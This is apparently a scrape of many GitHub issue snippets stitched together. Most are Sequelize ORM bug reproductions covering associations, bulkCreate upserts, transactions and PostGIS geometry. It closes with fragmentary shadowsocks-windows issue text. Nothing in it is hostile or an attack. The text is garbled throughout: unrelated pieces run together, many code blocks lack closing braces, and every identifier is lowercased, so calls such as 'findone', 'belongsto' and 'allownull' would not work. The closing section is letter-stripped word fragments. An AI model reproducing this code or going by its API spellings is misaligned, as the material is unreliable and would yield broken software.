const config = settings.database; function channelmodel(sequelize, datatypes) { return sequelize.define( 'channel', { id: { type: datatypes.integer, field: 'id', primarykey: true, autoincrement: true, allownull: false }, token: { type: datatypes.string(64), field: 'token', allownull: false } }, { timestamps: false, freezetablename: true, tablename: 'channel' } );
} function trackmodel(sequelize, datatypes) { return sequelize.define( 'track', { id: { type: datatypes.integer, field: 'id', primarykey: true, autoincrement: true, allownull: false }, token: { type: datatypes.string(64), field: 'token', allownull: false }, channelid: { type: datatypes.integer, field: 'channelid', allownull: false } }, { timestamps: false, freezetablename: true, tablename: 'track' } );
} const db = new sequelize(config.database, config.user, config.password, config);
channelmodel(db, sequelize.datatypes);
trackmodel(db, sequelize.datatypes); const { channel, track } = db.models; channel.hasmany(track, { foreignkey: 'channelid', sourcekey: 'id', as: 'tracks' });
track.belongsto(channel, { foreignkey: 'channelid', sourcekey: 'id', as: 'channel' }); (async () => { try { const channel = await channel.findone({ where: { token: 'channel-token' }, include: [{ model: track, as: 'tracks' }] }); console.log(channel.get({ plain: true })); } catch (err) { console.error('ops', err); } finally { db.close(); }
// define model with associate
position.belongsto(tracker, { foreignkey: { allownull: false }, ondelete: 'cascade' });
tracker.hasmany(app.model.position);
// sequelize model sync
sequelize.define('unit', { // ..
complex_id: { field: 'building_id', // 'building_id' is the pysical field for 'complex_id' reference: { model: 'complex', key: 'id' }, }, building_id: { field: 'immeuble_id', // 'immeuble_id' is the pysical field for 'building_id' reference: { model: 'building', key: 'id', }, },
}) // query a
unit.findandcount({ where: { complex_id: 123 }
}) // query b
another_entity.findandcount({ where: { }, include: [{ model:unit, where: { complex_id: 123 }, }],
**model** module.exports = class category extends basemodel { static init(sequelize, datatypes) { return super.init( { title: { type : datatypes.string, allownull: false, }, slug : { type : datatypes.string, allownull: false, unique : true } }, { sequelize, modelname : 'category', freezetablename: true, underscored : true }); } static associate(models) { this.belongsto(models.file, { targetkey: 'id', foreignkey: 'mediafileid' }); }
``` then i call the following:
```js await newcategory.reload({ attributes: ['slug', 'title'], include: [ { model : db.file, attributes: ['url'] } ] });
i\'m trying to create a query that returns a record if the where clause on the parent model or the where clause in an "included" child model match the condition
this is a reproduction of a bigger case in my project
there is some model `user` with a virtual attribute `derivedname` that depends on the attribute `name`
`user` belongs to some other model `foo`
i query for `foo`s, including their associated `user` with the `derivedname` attribute: foo.findall({ include: [{ model: user, attributes: ['derivedname'], }],
``` **here is the link to the sscce for this issue:** /pull/23
updating a record
user.js module.exports = (sequelize, datatypes) => { const user = sequelize.define('user', { name: { type: datatypes.string, allownull: false, }, }, { tablename: 'users', paranoid: false, timestamps: false, }); user.associate = function(models) { // associations can be defined here user.hasmany(models.project, { foreignkey: { name: 'userid', allownull: false, }, }); }; return user;
``` project.js
module.exports = (sequelize, datatypes) => { const project = sequelize.define('project', { value: { type: datatypes.string, allownull: false, }, }, { tablename: 'projects', paranoid: false, timestamps: false, }); project.associate = function(models) { // associations can be defined here project.belongsto(models.user, { foreignkey: { name: 'userid', allownull: false, }, }); }; return project;
``` i'd like to find any (`findone`) user without projects
const user = await models.user.findone({ where: { '$project.value$': { [models.sequelize.op.eq]: null } }, include: [{ model: models.project, required: false, }],
i select records from a table with geometry column (postgres db with postgis) and i get them without srid information, only geometry itself.
here is an example: 1
create a table
create table public.test_geom
( id integer not null default nextval('test_geom_id_seq'::regclass), geom geometry
with ( oids=false
insert a test record with srid:
insert into test_geom
values(st_setsrid(st_geomfromtext('point(30 60)'), 4326));
check geometry and srid in the table:
select st_srid(geom),* from test_geom
![ ]( 4
create a sequelize connection and define the table model: const sequelize = require('sequelize') const sequelize = new sequelize('test_gis', 'postgres', 'postgres', { host: 'localhost', dialect: 'postgres'
}) const testgeom = sequelize.define('testgeom', { id: { type: sequelize.integer, autoincrement: true, primarykey: true, allownull: false }, geom: { type: sequelize.geometry }
}, { schema: 'public', tablename: 'test_geom', timestamps: false
**here is the link to the sscce for this issue:** [sequelize-sscce#16](/pull/16) summary: ship.belongstomany(captain, { through: 'foobar', sourcekey: 'name', targetkey: 'nickname' });
captain.belongstomany(ship, { through: 'foobar', sourcekey: 'nickname', targetkey: 'name' });
// create some records ...
const ship = await ship.findone();
console.log(await ship.getcaptains()); // []
link to sscce pr: /pull/15 "use strict"; const config = require("../config");
const sequelize = require("sequelize"); async function main() { const sequelize = new sequelize(config.dburl, { pool: { max: 2, acquire: 1000 }, keepdefaulttimezone: true, timezone: "" /* suppress timezone warnings */ }); await sequelize.query("drop table if exists test1"); await sequelize.query("create table test1 (id int not null primary key)"); await sequelize.query("drop table if exists test2"); await sequelize.query("create table test2 (id int not null primary key)"); await sequelize.query("insert into test1 values (1)"); await sequelize.query("insert into test2 values (1)"); let t1 = await sequelize.transaction(); let t2 = await sequelize.transaction(); await sequelize.query("update test1 set id = id where id = 1", { transaction: t1 }); await sequelize.query("update test2 set id = id where id = 1", { transaction: t2 }); /* this query will wait on t2, don\'t block on it */ sequelize.query("update test2 set id = id where id = 1", { transaction: t1 }); try { await sequelize.query("update test1 set id = id where id = 1", { transaction: t2 }); } catch (e) { console.log(e.message); console.log("t2 status is " + t2.finished); /* cannot `t2.rollback()` here because it is marked as finished */ } try { let t3 = await sequelize.transaction(); } catch (e) { console.log(e.stack); }
main().then(() => process.exit(0));
i am trying to use `bulkcreate` to `updateonduplicate` when a duplicate is detected
duplicate should be detected by a "multi column unique index"
"use strict"; const sequelize = require("./index");
const sequelize = require("./test/support").createsequelizeinstance();
const chai = require("chai"), expect = chai.expect; class bar extends sequelize.model {}
bar.init( { value: sequelize.datatypes.string, timestamp: { type: sequelize.datatypes.date, allownull: false } }, { indexes: [ { name: "unique_timestamp_per_foo", unique: true, fields: ["timestamp", "fooid"] } ], sequelize }
); class foo extends sequelize.model {}
foo.init({}, { sequelize }); bar.belongsto(foo, { foreignkey: { allownull: false }, ondelete: "cascade"
foo.hasmany(bar, { foreignkey: { allownull: false }, ondelete: "cascade" }); (async () => { await sequelize.sync({ force: true }); // create a _parent_ `foo` model const foo = await foo.create(); // create a `bar` object const originalbar = await bar.create({ value: "original", timestamp: new date(date.utc(2016, 0, 1)), fooid: foo.id }); // we obviously expect a `bar` object to exist with the unique constraints of `timestamp` and `fooid` expect( await bar.count({ where: { fooid: foo.id, timestamp: new date(date.utc(2016, 0, 1)) } }) ).to.equal(1); // we create a modified `bar` object that has an overlapping `timestamp` and `fooid` // this should be detected as duplicate by the `uniquetimestampperfoo` unique constraint/index, // during the next `bulkcreate` operation with `updateonduplicate` set
const modifiedbar = bar.build({ value: "modified", timestamp: new date(date.utc(2016, 0, 1)), fooid: foo.id }); // "bulk" create to "upsert" a modified `existingbar` when conflict detected
// we only want `value` and `updatedat` to be updated on conflict
await expect( bar.bulkcreate([modifiedbar.tojson()], { updateonduplicate: ["value", "updatedat"], logging: console.log }) ).not.to.be.rejectedwith(sequelize.sequelizeuniqueconstrainterror); // *** the above function should not have been rejected with a `sequelizeuniqueconstrainterror` *** // *** the below is what should have been expected *** // reload the modified original `bar` object by `id` const refreshedoriginalbar = await bar.findbypk(originalbar.id); // the value should have been updated expect(refreshedoriginalbar.value).to.equal("modified"); // the refreshed updatedat should be greater than the original updatedat expect(refreshedoriginalbar.updatedat > originalbar.updatedat).be.true;
i'm trying to paginate reports (if you follow my sscce example) that has nested comments which has nested users
**here is the link to the sscce for this issue:** link-here
upserting users for testing: models.sequelize .sync() .then(async () => { if (process.env.upsert_test_users === "true") { const numtestusers = parseint(process.env.num_test_users || 50); const testusers = new array(numtestusers).fill(null).map((user, i) => ({ id: i, username: `test${i}`, discordid: `discordid${i}` })); await models.user.bulkcreate(testusers, { updateonduplicate: ["username", "discordid"] }); } }) .then(() => { debug("database synchronization succeeded."); /** * listen on provided port, on all network interfaces
*/ server.listen(port); server.on("error", onerror); server.on("listening", onlistening); }) .catch(err => { debug(`database synchronization failed: ${err}`); });
i'm inserting a record and using a database function (like `upper`) to format a field with a `$` in it
**here is the link to the sscce for this issue:** /pull/11 // more details in the link above const user = sequelize.define('user', { name: datatypes.text
}); await user.create({ name: sequelize.fn('upper', '$user3')
const config = { username: 'username', password: 'password', database: 'database', host: 'host', dialect: 'postgres', logging: true, pool: { max: 1, min: 1, acquire: 30000, idle: 10000 }
} const sequelize = new sequelize(config); sequelize.addhook('afterconnect', (client) => { //never fired client.on('notice', msg => { console.log('notice:', msg) }) //never fired client.on('notification', msg => { console.log(msg.channel) console.log(msg.payload) })
}); await sequelize.query('any query that triggers a notice or notification');
use module method : findbypk database: mysql mysql server install at windows
column: bigint(20) not null column content: 10000000000000001 (more than 10000000000000000)
**here is the link to the sscce for this issue:** /pull/9
post a minimal, self-contained code that reproduces the issue
it must be runnable by simply copying and pasting into an isolated js file, except possibly for the database connection configuration
--> // model class delta extends sequelize.model {} delta.init({ id: { type: sequelize.integer, autoincrement: true, primarykey: true }, padid: sequelize.string, authorid: sequelize.string, // delta: sequelize.jsonb, delta: sequelize.string(10000), deltaid: sequelize.integer }, { sequelize, modelname: 'delta' }) // query let perpage = 25
let offset = 0 const result = await delta.findandcountall({ limit: perpage, offset, order: [ ['padid', 'asc'] ], distinct: true, col: 'delta.padid'
post a minimal, self-contained code that reproduces the issue
it must be runnable by simply copying and pasting into an isolated js file, except possibly for the database connection configuration
--> let project = sequelize.define('tst_project', { title: sequelize.string, description: sequelize.text, text: { type: new sequelize.virtual(sequelize.string, ['title', 'description']), get: function() { return this.get('title') + ': ' + this.get('description'); } }
let task = sequelize.define('tst_task', { title: sequelize.string, description: sequelize.text, deadline: sequelize.date, text: { type: new sequelize.virtual(sequelize.string, ['title', 'id']), get: function() { return this.get('title') + ': ' + this.get('id'); } }
task.belongsto(project, {foreignkey: 'tstprojectid', targetkey: 'id', as: 'project'}); (async function(){ let project = await project.create({title: 'project 1', description: 'project 1 description'}); let task = await task.create({tstprojectid: 1, title: 'task 1', description: 'task 1 description'}); let results = await task.findall({ attributes: ['id'], include: [{ model: project, attributes: ['id', 'text'], as: 'project' }] }) console.log(results[0].get('project').get('text'));
```javascript
const sequelize = require('sequelize'); const models = [];
const connection = new sequelize({ dialect: 'postgres', host: 'localhost', port: 5432, database: 'test'
}); class listrevision extends sequelize.model {};
listrevision.init({ looplistid: sequelize.integer, tenantid: sequelize.integer, createasaliasid: sequelize.integer, createasuserid: sequelize.integer
}, { sequelize: connection, underscored: true, tablename: 'loop_list_revision'
}) /** * create the listsection model */
class listsection extends sequelize.model {};
listsection.init({ looplistrevisionid: sequelize.integer
}, { sequelize: connection, underscored: true, tablename: 'loop_list_section'
// associate
listrevision.hasmany(listsection, { foreignkey: 'looplistrevisionid'
}) /** * create the list model */
class list extends sequelize.model {};
list.init({ currentrevisionid: sequelize.integer
}, { sequelize: connection, underscored: true, tablename: 'loop_list'
// associate
listrevision.belongsto(list, { foreignkey: 'looplistid'
}); /** * create the user model */
class user extends sequelize.model {};
user.init({ }, { sequelize: connection, underscored: true, tablename: 'loop_user'
// associate
listrevision.belongsto(user, { foreignkey: 'createasuserid'
}); async function init() { /** sync models to database **/ models.push(list); models.push(user); models.push(listrevision); models.push(listsection); for (const model of models) { await model.sync({ force: true }); } /***********/ /** create data **/ const list = await list.create(); const listrevision = await listrevision.create({ looplistid: list.id }); list.currentrevisionid = listrevision.id; await list.save(); await listsection.bulkcreate([{ looplistrevisionid: listrevision.id }, { looplistrevisionid: listrevision.id }, { looplistrevisionid: listrevision.id }]) listrevision.findone({ include: [{ model: listsection }, { model: list, where: { // adding this nested where clause causes the issue currentrevisionid: { [sequelize.op.col]: 'listrevision.id' }, id: list.id }, }, { model: user }] }).then(user => { console.log(user) /** <--- this is null */ }).catch(error => { console.error(error) })
} init(); ```
const sequelize = require('sequelize');
const assert = require('assert'); const sequelize = new sequelize('postgres', 'postgres', 'password', { dialect: 'postgres', host: 'localhost',
sequelize.query("select \'star wars\' as title, 1977 as year_of_release", { type: \'select\', fieldmap: { title: \'title\', year_of_release: \'yearofrelease\', },
}).then((rows) => { assert.deepequal(rows, [{ title: 'star wars', yearofrelease: 1977 }])
}); setinterval(() => {}, number.max_safe_integer)
just copy and past it to the `getwhereconditions` unit test in `test/unit/sql/where.test.js` file and run `test-unit-mysql`: testsql([current.where(current.col('name'), null), current.where(current.fn('sum', current.col('hours')), '>', 0)], { default: '([name] is null and sum([hours]) > 0)' });
write a select query with the following where state
where: [{}, sequelize.where(sequelize.col('id'), op.ne, null), {'id': { [op.ne]: null }}]
const sequelize = require('sequelize')
const db = new sequelize(...) db.query(`create view v_fail as select 1 id`) .then(() => db.getqueryinterface().showalltables()) .then(r => { if (r.filter(e => e.tablename == "v_fail").length) { console.log("fail: v_fail returned from showalltables()") return 1 } else { console.log("pass") return 0 } }, err => { console.log(err) return 1 }) .then(status => db.query(`drop view v_fail`).then(r => status, e => status)) .then(status => process.exit(status))
minimal self contained reproducible example: const sequelize = require('sequelize'); const sequelize = new sequelize('postgres://postgres:postgres@localhost:5432/postgres'); class user extends sequelize.model {
user.init({ username: { type: sequelize.string, primarykey: true, field: 'user_name', }, email: { type: sequelize.string, } }, { sequelize }
); const user1 = { username: 'john smith',
}; user.sync({ force: true }).then(() => user.bulkcreate([user1], {updateonduplicate: [\'email\']}) // throws: unhandled rejection sequelizedatabaseerror: column "username" does not exist
i have boiled down a working code example that demonstrates this issue
create table `first` ( `id` int(10) unsigned not null auto_increment, `pid` int(10) unsigned not null default '0', `created_at` datetime not null, `updated_at` datetime not null, `deleted_at` datetime not null, primary key (`id`)
); create table `second` ( `id` int(10) unsigned not null auto_increment, `a` int(10) unsigned not null default '0', `b` int(10) unsigned not null default '0', `c` int(10) unsigned not null default '0', `d` int(10) unsigned not null default '0', `created_at` datetime not null, `updated_at` datetime not null, `deleted_at` datetime not null, `first_id` int(10) unsigned default null, primary key (`id`), constraint `second_ibfk_1` foreign key (`first_id`) references `first` (`id`) on delete cascade on update cascade
``` /* eslint-disable no-console, no-process-exit */
const sequelize = require('sequelize'); const sequelize = new sequelize('test', 'root', null, { host: '127.0.0.1', dialect: 'mysql', logging: console.log,
}); const firstmodel = sequelize.define('first', { id: { primarykey: true, type: sequelize.datatypes.integer.unsigned, autoincrement: true, }, pid: { type: sequelize.datatypes.integer.unsigned, },
}, { underscored: true, paranoid: true, tablename: 'first',
}); // create the model
const secondmodel = sequelize.define('second', { id: { primarykey: true, type: sequelize.datatypes.integer.unsigned, autoincrement: true, }, a: { type: sequelize.datatypes.integer.unsigned, allownull: false, defaultvalue: 0, }, b: { type: sequelize.datatypes.integer.unsigned, allownull: false, defaultvalue: 0, }, c: { type: sequelize.datatypes.integer.unsigned, allownull: false, defaultvalue: 0, }, d: { type: sequelize.datatypes.integer.unsigned, allownull: false, defaultvalue: 0, },
}, { underscored: true, paranoid: false, tablename: 'second',
}); // setup associations
secondmodel.belongsto(firstmodel);
firstmodel.hasmany(secondmodel); /** * run the test logic
* @returns {void} */
const run = async function() { // get the sums of all activity for all time const aggregatedsums = await secondmodel.findone({ attributes: [ [sequelize.fn('sum', sequelize.col('a')), 'a'], [sequelize.fn('sum', sequelize.col('b')), 'b'], [sequelize.fn('sum', sequelize.col('c')), 'c'], [sequelize.fn('sum', sequelize.col('d')), 'd'], ], include: [{ attributes: [], model: firstmodel, where: { pid: 1, }, }], group: [[firstmodel, 'pid']], }); console.log(aggregatedsums);
}; run().then(() => { console.log('done'); process.exit(0);
}).catch((err) => { console.error(err); process.exit(1);
post a minimal, self-contained code that reproduces the issue
it must be runnable by simply copying and pasting into an isolated js file, except possibly for the database connection configuration
--> //so here is my sequelize model, which is a join table between the tables shows and tags (i commented out the associations to make sure that the issue is not with associations): module.exports = (sequelize, datatypes) => { const showstag = sequelize.define('showstag', { showid: { type: datatypes.bigint, allownull: false, field: 'show_id' }, tagid: { type: datatypes.bigint, allownull: false, field: 'tag_id' }, tagconnecttype: { type: datatypes.string, allownull: true, field: 'tag_connect_type' } }, { tablename: 'shows_tags', timestamps: true, underscored: true }); showstag.associate = function(models) { // associations can be defined here //models.showstag.belongsto(models.tag, {as: 'tag'}); //models.showstag.belongsto(models.show, {as: 'show'}); }; return showstag; }; //here is the code where i am creating a new record: db.showstag.create({showid: 3, tagid: 3, tagconnecttype: 'channel'}).then(d => console.log(d) )
i have a model `themodel` with a scope `scoped` containing `order` , say `order1`.
on invoking a findall with an `order`, say `order2`, the resulting order is `order1`, `order2` ``` themodel.addscope('scoped', { order: [ [associatedmodel1, 'foo', 'asc'], [associatedmodel2, 'bar', 'asc'], ]
}); scopedmodel.findall({ order: [ ['field1', 'asc'], [associatedmodel1, 'foo', 'asc'], ]
```javascript
const sequelize = require('sequelize'); const table = sequelize.define('test', { slug: { type: sequelize.string },
{ indexes: [ { name: 'test_slug_idx', singlefield: true, fields: ['slug'], }, ],
}); sequelize.sync({ force: true });
``` rolling back to `5.17.2` fixes issue.
class foo extends model {}
foo.init({ /* bla */ }, { tablename: 'table_with_discriminator', sequelize
}) class bar extends model {}
bar.init({ /* bla */ }, { tablename: 'table_with_discriminator', sequelize
}) const updates = await bar.update( { prop: 'value' }, { where: { id: 'xxx }, returning: true } );
const updatedinstance = updates[1][0]; // this is an instance of foo
p ps
![demo](
1 ser-rule.txt
2 hadowsocks
ac fwlist ac
hadowsocks
in10
shadowsocks.exe
u hadowsocks u s u ~~ ~~ netsh winsock reset
write translation to disk
translate generated csv
.1.9.2 oogle cloud platform
.1.9.2 cafee .1.8.0
just replaced .exe with new version
ac ac
rr_empty_response
ac secret ac
/ - windows10 in+p -
right-click the icon -> help -> about...
/ ac.txt ac.js ode ```js
console.log(findproxyforurl(" ", "api.aixcoder.com"))
// __proxy__ `rules` "||api.ai" irect;
(youtube.com)
shadowsocks.log "shadowsocks started" ntry
shadowsocks.log "[e] decryption error"
"[e] decryption error",
windows
simple-obfs
on shadowsocks-windows share ipv6 server config and scan qrcode using shadowsocks-android
rl
i exported url from shadowsocks-windows 4.0.5 and found it cannot be imported into version 4.0.6.
and i also tried generate url in version 4.0.6, but it generated the same url as 4.0.5
so it also cannot be imported into 4.0.6.
many times for toggle enable system proxy
clean all configure files
2. ser-rule.txt
.3.4 [** **] xception
clone .3.3
1, open server edit window
duplicate a server
edit another server
move the server up
